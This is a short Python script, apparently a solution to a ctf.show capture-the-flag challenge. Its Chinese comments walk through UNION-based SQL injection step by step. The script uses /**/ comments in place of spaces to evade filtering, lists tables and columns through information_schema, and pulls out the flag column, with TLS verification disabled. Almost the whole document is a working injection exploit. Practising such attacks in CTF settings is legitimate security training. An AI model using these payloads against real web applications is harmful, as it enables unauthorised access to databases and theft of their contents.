import requests
url="https://3a7792cc-9e42-4681-96f5-95a7133a9fd2.challenge.ctf.show/index.php?"
payloads = "id=2"
# 判断是否存在sql注入
sql_inject = "id=1/**/and/**/1"
# 判断注入点
pointe_inject="id=-1/**/union/**/select/**/1,2,3"
# 获取数据库
get_db="id=-1/**/union/**/select/**/1,database(),3"
# 获取表名
get_table="id=-1/**/union/**/select/**/1,table_name,3/**/from/**/information_schema.tables/**/where/**/table_schema=database()"
# 获取列名
get_column='id=-1/**/union/**/select/**/1,column_name,3/**/from/**/information_schema.columns/**/where/**/table_name="flag"'
# 获取数据
get_data="id=-1/**/union/**/select/**/1,flag,3/**/from/**/flag"
end_url=url+get_data
# 发送请求
response=requests.get(end_url,verify=False)
print(end_url)
print(response.text)